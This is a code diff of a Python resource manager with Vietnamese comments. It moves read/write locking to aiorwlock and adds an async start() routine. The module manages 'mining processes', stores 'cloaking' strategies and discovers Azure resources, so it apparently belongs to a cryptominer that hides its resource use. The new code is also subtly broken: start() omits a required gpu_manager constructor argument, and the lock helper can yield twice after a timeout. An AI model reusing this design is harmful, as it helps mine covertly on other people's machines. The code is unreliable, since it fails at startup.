@@ -6,13 +6,16 @@ import psutil
 import pynvml
 import traceback
 import asyncio
+import aiorwlock
 from asyncio import Queue as AsyncQueue, Event
 from typing import List, Any, Dict, Optional, Tuple
 from itertools import count
 from contextlib import asynccontextmanager
 from threading import Lock  # Giữ lại Lock cho Singleton
 
-from readerwriterlock import rwlock
+
+
+#from readerwriterlock import rwlock
 
 # Import các module phụ trợ từ dự án
 from .base_manager import BaseManager
@@ -47,50 +50,57 @@ import aiofiles  # Thêm aiofiles để xử lý I/O bất đồng bộ
 #                     BỔ SUNG: EVENT-DRIVEN & WATCHER MODULE                  #
 ###############################################################################
 
+
 @asynccontextmanager
-async def acquire_lock_with_timeout(lock: rwlock.RWLockFair, lock_type: str, timeout: float):
+async def acquire_lock_with_timeout(lock: aiorwlock.RWLock, lock_type: str, timeout: float):
     """
-    Async context manager để chiếm khóa với timeout.
-    Cách dùng tương tự như trước, nhưng ta giữ nguyên để dùng chung.
+    Async context manager để chiếm khóa với thời gian chờ (timeout) sử dụng aiorwlock.
+
+    Args:
+        lock (aiorwlock.RWLock): Đối tượng khóa đọc/ghi.
+        lock_type (str): Loại khóa cần chiếm, 'read' hoặc 'write'.
+        timeout (float): Thời gian chờ tối đa để chiếm khóa.
+
+    Yields:
+        Optional[aiorwlock.RWLock.ReadLock or aiorwlock.RWLock.WriteLock]: Khóa đã chiếm được hoặc None nếu timeout.
+    
+    Raises:
+        ValueError: Nếu lock_type không phải 'read' hoặc 'write'.
+        asyncio.TimeoutError: Nếu không chiếm được khóa trong thời gian chờ.
     """
     if lock_type == 'read':
-        acquired_lock = lock.gen_rlock()
+        acquired_lock = lock.reader_lock
     elif lock_type == 'write':
-        acquired_lock = lock.gen_wlock()
+        acquired_lock = lock.writer_lock
     else:
         raise ValueError("lock_type phải là 'read' hoặc 'write'.")
 
+    acquired = False
     try:
         await asyncio.wait_for(acquired_lock.acquire(), timeout=timeout)
-        try:
-            yield acquired_lock
-        finally:
-            acquired_lock.release()
+        acquired = True
+        yield acquired_lock
     except asyncio.TimeoutError:
         yield None
-
+    finally:
+        if acquired:
+            await acquired_lock.release()
 
 class SharedResourceManager:
     """
     Lớp cung cấp các hàm điều chỉnh tài nguyên (CPU, RAM, GPU, Disk, Network...).
     Tích hợp với ResourceControlFactory để quản lý resource managers.
-
-    *Điểm mới*: 
-    - Vẫn giữ nguyên các hàm điều chỉnh/cloaking/restore,
-      nhưng được gọi bởi cơ chế event-driven từ các watcher.
     """
-    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
+    def __init__(self, config: Dict[str, Any], logger: logging.Logger, gpu_manager: GPUManager, resource_managers: Dict[str, Any]):
         """
-        Khởi tạo SharedResourceManager với cấu hình và logger.
+        Khởi tạo SharedResourceManager với cấu hình, logger và resource_managers.
         """
         self.config = config
         self.logger = logger
-        self.gpu_manager = GPUManager()
+        self.gpu_manager = gpu_manager
+        self.resource_managers = resource_managers
         self.power_manager = PowerManager()
         self.strategy_cache = {}  # Cache cho các chiến lược cloaking
-
-        # Khởi tạo resource managers
-        self.resource_managers = ResourceControlFactory.create_resource_managers(self.logger)
 
     def is_gpu_initialized(self) -> bool:
         """
@@ -283,7 +293,7 @@ class ResourceManager(BaseManager, IResourceManager):
         self.stop_event = Event()
 
         # Lock bảo vệ shared data
-        self.resource_lock = rwlock.RWLockFair()
+        self.resource_lock = aiorwlock.RWLock()
 
         # Hàng đợi chính để nhận các event điều chỉnh tài nguyên
         self.resource_adjustment_queue = AsyncQueue()
@@ -293,15 +303,9 @@ class ResourceManager(BaseManager, IResourceManager):
 
         # Danh sách các tiến trình khai thác
         self.mining_processes = []
-        self.mining_processes_lock = rwlock.RWLockFair()
+        self.mining_processes_lock = aiorwlock.RWLock()
         self._counter = count()
 
-        # Khởi tạo Azure Clients
-        self.initialize_azure_clients()
-        self.discover_azure_resources()
-
-        # Khởi tạo SharedResourceManager
-        self.shared_resource_manager = SharedResourceManager(config, logger)
 
         # Bổ sung: Danh sách watchers
         self.watchers = []
@@ -311,11 +315,27 @@ class ResourceManager(BaseManager, IResourceManager):
     #             KHỞI TẠO/SHUTDOWN & AZURE CLIENT LIÊN QUAN                 #
     ##########################################################################
 
+
     async def is_gpu_initialized(self) -> bool:
         """
         Override phương thức trừu tượng trong IResourceManager.
         """
-        return self.shared_resource_manager.is_gpu_initialized()
+        try:
+            return self.shared_resource_manager.is_gpu_initialized()
+        except Exception as e:
+            self.logger.error(f"Lỗi khi kiểm tra GPU initialization: {e}\n{traceback.format_exc()}")
+            return False
+        
+
+    async def restore_resources(self, process: MiningProcess) -> bool:
+        """
+        Triển khai phương thức trừu tượng restore_resources từ IResourceManager.
+        """
+        try:
+            return await self.shared_resource_manager.restore_resources(process)
+        except Exception as e:
+            self.logger.error(f"Lỗi trong restore_resources cho PID={process.pid}: {e}\n{traceback.format_exc()}")
+            return False
 
 
     def initialize_azure_clients(self):
@@ -724,4 +744,46 @@ class ResourceManager(BaseManager, IResourceManager):
         await asyncio.gather(*tasks)
 
         self.logger.info("ResourceManager đã dừng.")
-        shutdown_power_management()
+
+    ##########################################################################
+    #                           PHƯƠNG THỨC start()                         #
+    ##########################################################################
+
+    async def start(self):
+        """
+        Coroutine để khởi động ResourceManager, bao gồm khởi tạo GPUManager và các watchers.
+        """
+        self.logger.info("Bắt đầu khởi động ResourceManager...")
+
+        try:
+            # 1. Khởi tạo và gọi initialize cho GPUManager
+            self.gpu_manager = GPUManager()
+            initialized = await self.gpu_manager.initialize()
+            if not initialized:
+                self.logger.warning("GPUManager không được khởi tạo - vô hiệu hoá tính năng GPU.")
+
+            # 2. Khởi tạo SharedResourceManager sau khi GPUManager đã được khởi tạo
+            resource_managers = await ResourceControlFactory.create_resource_managers(
+                logger=self.logger,
+                gpu_manager=self.gpu_manager
+            )
+            self.shared_resource_manager = SharedResourceManager(
+                self.config,
+                self.logger,
+                resource_managers=resource_managers
+            )
+
+            # 3. Khởi tạo Azure Clients
+            self.initialize_azure_clients()
+
+            # 4. Khám phá các tài nguyên Azure
+            await self.discover_azure_resources()
+
+            # 5. Khởi chạy các watcher
+            await self.start_watchers()
+
+            self.logger.info("ResourceManager đã khởi động thành công.")
+        except Exception as e:
+            self.logger.error(f"Lỗi khi khởi động ResourceManager: {e}\n{traceback.format_exc()}")
+            await self.shutdown()  # Dừng nếu có lỗi khi start
+            raise
